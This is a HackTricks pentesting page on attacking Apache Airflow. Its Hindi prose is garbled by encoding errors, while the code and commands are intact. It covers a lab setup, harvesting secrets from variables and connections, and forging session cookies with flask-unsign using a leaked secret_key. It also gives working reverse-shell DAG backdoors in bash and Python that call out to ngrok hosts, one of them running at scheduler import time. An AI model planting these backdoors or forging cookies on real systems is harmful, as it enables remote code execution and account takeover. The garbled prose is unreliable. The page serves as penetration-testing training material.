# Apache Airflow рд╕реБрд░рдХреНрд╖рд╛

<details>

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг AWS рд░реЗрдб рдЯреАрдо рд╡рд┐рд╢реЗрд╖рдЬреНрдЮ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг GCP рд░реЗрдб рдЯреАрдо рд╡рд┐рд╢реЗрд╖рдЬреНрдЮ (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж рдкрд░ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛ рдореЗрдВред

</details>
{% endhint %}

## рдореВрд▓ рдЬрд╛рдирдХрд╛рд░реА

[**Apache Airflow**](https://airflow.apache.org) **рдбреЗрдЯрд╛ рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдпрд╛ рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдХрд╛ рдЖрдпреЛрдЬрди рдФрд░ рдЕрдиреБрд╕реВрдЪрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ**ред рдбреЗрдЯрд╛ рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдХреЗ рд╕рдВрджрд░реНрдн рдореЗрдВ "рдЖрдпреЛрдЬрди" рд╢рдмреНрдж рд╡рд┐рднрд┐рдиреНрди рд╕реНрд░реЛрддреЛрдВ рд╕реЗ рдЙрддреНрдкрдиреНрди рдЬрдЯрд┐рд▓ рдбреЗрдЯрд╛ рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдХреЛ рд╡реНрдпрд╡рд╕реНрдерд┐рдд, рд╕рдордиреНрд╡рд┐рдд рдФрд░ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рдиреЗ рдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХрд╛ рд╕рдВрдХреЗрдд рдХрд░рддрд╛ рд╣реИред рдЗрди рдЖрдпреЛрдЬрд┐рдд рдбреЗрдЯрд╛ рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдХрд╛ рдореБрдЦреНрдп рдЙрджреНрджреЗрд╢реНрдп рдкреНрд░рд╕рдВрд╕реНрдХреГрдд рдФрд░ рдЙрдкрднреЛрдЧреНрдп рдбреЗрдЯрд╛ рд╕реЗрдЯ рдкреНрд░рджрд╛рди рдХрд░рдирд╛ рд╣реИред рдпреЗ рдбреЗрдЯрд╛ рд╕реЗрдЯ рд╡реНрдпрд╛рдкрдХ рд░реВрдк рд╕реЗ рд╡реНрдпрд╛рд╡рд╕рд╛рдпрд┐рдХ рдмреБрджреНрдзрд┐рдорддреНрддрд╛ рдЙрдкрдХрд░рдг, рдбреЗрдЯрд╛ рд╡рд┐рдЬреНрдЮрд╛рди рдФрд░ рдорд╢реАрди рд▓рд░реНрдирд┐рдВрдЧ рдореЙрдбрд▓ рдЬреИрд╕реЗ рдЕрдиреЗрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреЛрдВ рджреНрд╡рд╛рд░рд╛ рд╡реНрдпрд╛рдкрдХ рд░реВрдк рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ, рдЬреЛ рд╕рднреА рдмрдбрд╝реЗ рдбреЗрдЯрд╛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрди рдХреЗ рд▓рд┐рдП рдореМрд▓рд┐рдХ рд╣реИрдВред

рдореБрдЦреНрдп рд░реВрдк рд╕реЗ, Apache Airflow рдЖрдкрдХреЛ рдХреЛрдб рдХреЗ рдирд┐рд╖реНрдкрд╛рджрди рдХреЛ **рдЕрдиреБрд╕реВрдЪрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдЧрд╛ рдЬрдм рдХреБрдЫ рд╣реЛрддрд╛ рд╣реИ** (рдШрдЯрдирд╛, cron)ред

## рд╕реНрдерд╛рдиреАрдп рдкреНрд░рдпреЛрдЧрд╢рд╛рд▓рд╛

### рдбреЙрдХрд░-рдХрдВрдкреЛрдЬ

рдЖрдк **рдбреЙрдХрд░-рдХрдВрдкреЛрдЬ рд╡рд┐рдиреНрдпрд╛рд╕ рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** [**https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml**](https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml) рдПрдХ рдкреВрд░реНрдг рдПрдкрд╛рдЪреЗ рдПрдпрд░рдлреНрд▓реЛ рдбреЙрдХрд░ рдкрд░рд┐рд╡реЗрд╢ рд▓реЙрдиреНрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред (рдпрджрд┐ рдЖрдк MacOS рдореЗрдВ рд╣реИрдВ рддреЛ рдбреЙрдХрд░ VM рдХреЛ рдХрдо рд╕реЗ рдХрдо 6GB рд░реИрдо рджреЗрдиреЗ рдХрд╛ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ)ред

### рдорд┐рдиреАрдХреНрдпреВрдм

рдПрдХ рдЖрд╕рд╛рди рддрд░реАрдХрд╛ **рдПрдкрд╛рдЪреЗ рдПрдпрд░рдлреНрд▓реЛ** рдХреЛ рдЪрд▓рд╛рдиреЗ рдХрд╛ рдПрдХ рддрд░реАрдХрд╛ рд╣реИ **рдорд┐рдиреАрдХреНрдпреВрдм рдХреЗ рд╕рд╛рде рдЗрд╕реЗ рдЪрд▓рд╛рдирд╛**:
```bash
helm repo add airflow-stable https://airflow-helm.github.io/charts
helm repo update
helm install airflow-release airflow-stable/airflow
# Some information about how to aceess the web console will appear after this command

# Use this command to delete it
helm delete airflow-release
```
## Airflow Configuration

Airflow рдореЗрдВ **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА** рд░рдЦреА рдЬрд╛ рд╕рдХрддреА рд╣реИ рдпрд╛ рдЖрдкрдХреЛ рдХрдордЬреЛрд░ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдорд┐рд▓ рд╕рдХрддреА рд╣реИ:

{% content-ref url="airflow-configuration.md" %}
[airflow-configuration.md](airflow-configuration.md)
{% endcontent-ref %}

## Airflow RBAC

Airflow рдкрд░ рд╣рдорд▓рд╛ рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдЖрдкрдХреЛ рд╕рдордЭрдирд╛ рдЪрд╛рд╣рд┐рдП **рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреИрд╕реЗ рдХрд╛рдо рдХрд░рддреА рд╣реИрдВ**:

{% content-ref url="airflow-rbac.md" %}
[airflow-rbac.md](airflow-rbac.md)
{% endcontent-ref %}

## рд╣рдорд▓реЗ

### рд╡реЗрдм рдХрдВрд╕реЛрд▓ рдЬрд╛рдВрдЪ

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **рд╡реЗрдм рдХрдВрд╕реЛрд▓ рддрдХ рдкрд╣реБрдВрдЪ** рд╣реИ рддреЛ рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЬрд╛рдирдХрд╛рд░реА рдореЗрдВ рд╕реЗ рдХреБрдЫ рдпрд╛ рд╕рднреА рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ:

* **рдЪрд░** (рдпрд╣рд╛рдВ рдХрд╕реНрдЯрдо рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рд╕рдВрдЧреНрд░рд╣рд┐рдд рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ)
* **рдХрдиреЗрдХреНрд╢рди** (рдпрд╣рд╛рдВ рдХрд╕реНрдЯрдо рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рд╕рдВрдЧреНрд░рд╣рд┐рдд рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ)
* рдЗрдиреНрд╣реЗрдВ `http://<airflow>/connection/list/` рдореЗрдВ рдПрдХреНрд╕реЗрд╕ рдХрд░реЗрдВ
* [**рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди**](./#airflow-configuration) (рдпрд╣рд╛рдВ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдЬреИрд╕реЗ **`secret_key`** рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рд╕рдВрдЧреНрд░рд╣рд┐рдд рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ)
* рд╕реВрдЪреА **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдФрд░ рднреВрдорд┐рдХрд╛рдПрдБ**
* рдкреНрд░рддреНрдпреЗрдХ DAG рдХрд╛ **рдХреЛрдб** (рдЬрд┐рд╕рдореЗрдВ рджрд┐рд▓рдЪрд╕реНрдк рдЬрд╛рдирдХрд╛рд░реА рд╣реЛ рд╕рдХрддреА рд╣реИ)

### рдЪрд░ рдорд╛рдиреЛрдВ рдХреЛ рдкреБрдирдГ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ

рдЪрд░ Airflow рдореЗрдВ рд╕рдВрдЧреНрд░рд╣рд┐рдд рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ **DAGs** рдЙрдирдХреЗ рдорд╛рдиреЛрдВ рддрдХ **рдкрд╣реБрдВрдЪ** рд╕рдХреЗрдВред рдпрд╣ рдЕрдиреНрдп рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдореЛрдВ рдХреЗ рд░рд╣рд╕реНрдпреЛрдВ рдХреЗ рд╕рдорд╛рди рд╣реИред рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **рдкрд░реНрдпрд╛рдкреНрдд рдЕрдиреБрдорддрд┐рдпрд╛рдБ** рд╣реИрдВ рддреЛ рдЖрдк рдЙрдиреНрд╣реЗрдВ GUI рдореЗрдВ `http://<airflow>/variable/list/` рдореЗрдВ рдПрдХреНрд╕реЗрд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
рдПрдпрд░рдлреНрд▓реЛ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ GUI рдореЗрдВ рдЪрд░ рдХреЗ рдорд╛рди рдХреЛ рджрд┐рдЦрд╛рдПрдЧрд╛, рд╣рд╛рд▓рд╛рдВрдХрд┐, [**рдЗрд╕**](https://marclamberti.com/blog/variables-with-apache-airflow/) рдХреЗ рдЕрдиреБрд╕рд╛рд░ рдПрдХ **рд╕реВрдЪреА рдЪрд░** рд╕реЗрдЯ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ рдЬрд┐рд╕рдХреЗ **рдорд╛рди** GUI рдореЗрдВ **рдПрд╕реНрдЯреНрд░рд┐рдХреНрд╕** рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рдХрдЯ рд╣реЛрдВрдЧреЗред

![](<../../.gitbook/assets/image (164).png>)

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпреЗ **рдорд╛рди** рдЕрдм рднреА **CLI** (рдЖрдкрдХреЛ рдбреАрдмреА рдПрдХреНрд╕реЗрд╕ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП), **рдЕрд░реНрдмрд┐рдЯреНрд░реЗ DAG** рдирд┐рд╖реНрдкрд╛рджрди, **рдПрдкреАрдЖрдИ** рдЬреЛ рдЪрд░реЛрдВ рдХреЗ рдПрдВрдбрдкреЙрдЗрдВрдЯ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ (рдПрдкреАрдЖрдИ рд╕рдХреНрд░рд┐рдп рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП), рдФрд░ **рдпрд╣рд╛рдВ рддрдХ рдХрд┐ GUI рдЦреБрдж рд╕реЗ рднреА!**\
рдЙрди рдорд╛рдиреЛрдВ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП GUI рд╕реЗ рдмрд╕ **рдЪрд░реЛрдВ рдХреЛ рдЪреБрдиреЗрдВ** рдЬрд┐рдиреНрд╣реЗрдВ рдЖрдк рдПрдХреНрд╕реЗрд╕ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдФрд░ **рдХреНрд░рд┐рдпрд╛рдПрдБ -> рдирд┐рд░реНрдпрд╛рдд** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред\
рдПрдХ рдФрд░ рддрд░реАрдХрд╛ рд╣реИ **рдЧреБрдкреНрдд рдорд╛рди** рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдмреНрд░реВрдЯрдлрд╝реЛрд░реНрд╕** рдХрд░рдирд╛ рдЬрд┐рд╕реЗ рдЖрдкрдХреЛ рдЗрд╕реЗ рдкреНрд░рд╛рдкреНрдд рд╣реЛрдиреЗ рддрдХ **рдЦреЛрдЬ рдлрд╝рд┐рд▓реНрдЯрд░рд┐рдВрдЧ** рдХрд░рдирд╛ рд╣реЛрдЧрд╛:

![](<../../.gitbook/assets/image (152).png>)

### рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЙрдиреНрдирдпрди

рдпрджрд┐ **`expose_config`** рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЛ **рд╕рдЪ** рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рднреВрдорд┐рдХрд╛** рдФрд░ **рдКрдкрд░** рд╕реЗ **рд╡реЗрдм рдореЗрдВ** рдХреЙрдиреНрдлрд╝рд┐рдЧ рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕ рдХреЙрдиреНрдлрд╝рд┐рдЧ рдореЗрдВ **`secret_key`** рджрд┐рдЦрд╛рдИ рджреЗрддрд╛ рд╣реИ, рдЬрд┐рд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкрд╛рд╕ рдЗрд╕ рд╡реИрдз рд╡реЗ рдЕрдкрдирд╛ рдЦреБрдж рдХрд╛ рд╕рд╛рдЗрди рдХреБрдХреА рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдХрд┐рд╕реА рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддрд╛ рдЕрдиреБрдХрд░рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```bash
flask-unsign --sign --secret '<secret_key>' --cookie "{'_fresh': True, '_id': '12345581593cf26619776d0a1e430c412171f4d12a58d30bef3b2dd379fc8b3715f2bd526eb00497fcad5e270370d269289b65720f5b30a39e5598dad6412345', '_permanent': True, 'csrf_token': '09dd9e7212e6874b104aad957bbf8072616b8fbc', 'dag_status_filter': 'all', 'locale': 'en', 'user_id': '1'}"
```
### DAG рдмреИрдХрдбреЛрд░ (Airflow рдХрд╛рд░реНрдпрдХрд░реНрддрд╛ рдореЗрдВ RCE)

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **рд▓реЗрдЦрди рдЕрдзрд┐рдХрд╛рд░** рд╣реИ рдЬрд╣рд╛рдВ **DAGs рд╕рд╣реЗрдЬреЗ рдЬрд╛рддреЗ рд╣реИрдВ**, рддреЛ рдЖрдк рдмрд╕ **рдПрдХ рдРрд╕рд╛** рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдЖрдкрдХреЛ **рд░рд┐рд╡рд░реНрд╕ рд╢реИрд▓** рднреЗрдЬреЗрдЧрд╛ред\
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ рд░рд┐рд╡рд░реНрд╕ рд╢реИрд▓ **рдПрдХ airflow рдХрд╛рд░реНрдпрдХрд░реНрддрд╛ рдХрдВрдЯреЗрдирд░** рдХреЗ рдЕрдВрджрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдЧрд╛:
```python
import pendulum
from airflow import DAG
from airflow.operators.bash import BashOperator

with DAG(
dag_id='rev_shell_bash',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = BashOperator(
task_id='run',
bash_command='bash -i >& /dev/tcp/8.tcp.ngrok.io/11433  0>&1',
)
```

```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

with DAG(
dag_id='rev_shell_python',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python',
python_callable=rs,
op_kwargs={"rhost":"8.tcp.ngrok.io", "port": 11433}
)
```
### DAG рдмреИрдХрдбреЛрд░ (Airflow рд╕реНрдХреЗрдЬреНрдпреВрд▓рд░ рдореЗрдВ RCE)

рдпрджрд┐ рдЖрдк рдХрд┐рд╕реА рдЪреАрдЬ рдХреЛ **рдХреЛрдб рдХреА рдЬрдбрд╝ рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рд╕реЗрдЯ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдЗрд╕ рд▓реЗрдЦ рдХреЗ рд▓рд┐рдЦрдиреЗ рдХреЗ рд╕рдордп рдкрд░, рдпрд╣ **DAG рдХреЗ рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рд░рдЦрдиреЗ рдХреЗ рдХреБрдЫ рд╕реЗрдХрдВрдб рдмрд╛рдж рд╕реНрдХреЗрдЬреНрдпреВрд▓рд░ рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛**ред
```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

rs("2.tcp.ngrok.io", 14403)

with DAG(
dag_id='rev_shell_python2',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python2',
python_callable=rs,
op_kwargs={"rhost":"2.tcp.ngrok.io", "port": 144}
```
### DAG рдирд┐рд░реНрдорд╛рдг

рдпрджрд┐ рдЖрдк **DAG рдХреНрд▓рд╕реНрдЯрд░ рдХреЗ рдЕрдВрджрд░ рдХреА рдХрд┐рд╕реА рдорд╢реАрди рдХреЛ рдХрдВрдкреНрд░реЛрдорд╛рдЗрдЬ** рдХрд░ рд▓реЗрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк `dags/` рдлреЛрд▓реНрдбрд░ рдореЗрдВ рдирдП **DAG рд╕реНрдХреНрд░рд┐рдкреНрдЯ** рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╡реЗ **DAG рдХреНрд▓рд╕реНрдЯрд░ рдХреЗ рдЕрдиреНрдп рдорд╢реАрдиреЛрдВ рдореЗрдВ рдкреНрд░рддрд┐рд▓рд┐рдкрд┐** рдмрди рдЬрд╛рдПрдВрдЧреЗред

### DAG рдХреЛрдб рдЗрдВрдЬреЗрдХреНрд╢рди

рдЬрдм рдЖрдк GUI рд╕реЗ DAG рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдЗрд╕реЗ рдХреЛрдИ **рдЖрд░реНрдЧреНрдпреВрдореЗрдВрдЯ рдкрд╛рд╕** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ DAG рдХреЛ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдХреЛрдб рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рддреЛ рдпрд╣ **рдХрдорд╛рдВрдб рдЗрдВрдЬреЗрдХреНрд╢рди рдХреЗ рд▓рд┐рдП рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ**ред\
рдпрд╣реА рд╡рд╣ рдХрд╛рд░рдг рд╣реИ рдЬреЛ рдЗрд╕ CVE рдореЗрдВ рд╣реБрдЖ: [https://www.exploit-db.com/exploits/49927](https://www.exploit-db.com/exploits/49927)

рдЖрдкрдХреЛ **DAGs рдореЗрдВ рдХрдорд╛рдВрдб рдЗрдВрдЬреЗрдХреНрд╢рди рдХреА рдЦреЛрдЬ рд╢реБрд░реВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП** рдЬреЛ рдХреБрдЫ рднреА рдЬрд╛рдирдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ, рд╡рд╣ рдпрд╣ рд╣реИ рдХрд┐ **рдкреИрд░рд╛рдореАрдЯрд░** рдХреЛ рдХреЛрдб рдХреЗ рд╕рд╛рде **`dag_run.conf.get("param_name")`** рд╕реЗ **рдПрдХреНрд╕реЗрд╕** рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, **рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕** рдХреЗ рд╕рд╛рде рднреА рдПрдХ рд╣реА рд╕рдВрд╡реЗрджрдирд╢реАрд▓рддрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИ (рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдкрд░реНрдпрд╛рдкреНрдд рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде рдЖрдк GUI рдореЗрдВ **рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕ рдХреЗ рдорд╛рди рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**)ред рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕ рдХреЛ **рдЗрд╕ рддрд░рд╣ рд╕реЗ рдПрдХреНрд╕реЗрд╕** рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:
```python
from airflow.models import Variable
[...]
foo = Variable.get("foo")
```
рдпрджрд┐ рд╡реЗ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд░реВрдк рдореЗрдВ рдПрдХ рдмреИрд╢ рдХрдорд╛рдВрдб рдХреЗ рдЕрдВрджрд░ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдПрдХ рдХрдорд╛рдВрдб рдЗрдВрдЬреЗрдХреНрд╢рди рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

<details>

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг AWS рд░реЗрдб рдЯреАрдо рд╡рд┐рд╢реЗрд╖рдЬреНрдЮ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг GCP рд░реЗрдб рдЯреАрдо рд╡рд┐рд╢реЗрд╖рдЬреНрдЮ (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕** рдХреЛ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗ рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛ рдореЗрдВ рдкреНрд░рд╕реНрддреБрдд рдХрд░рдХреЗред

</details>
{% endhint %}
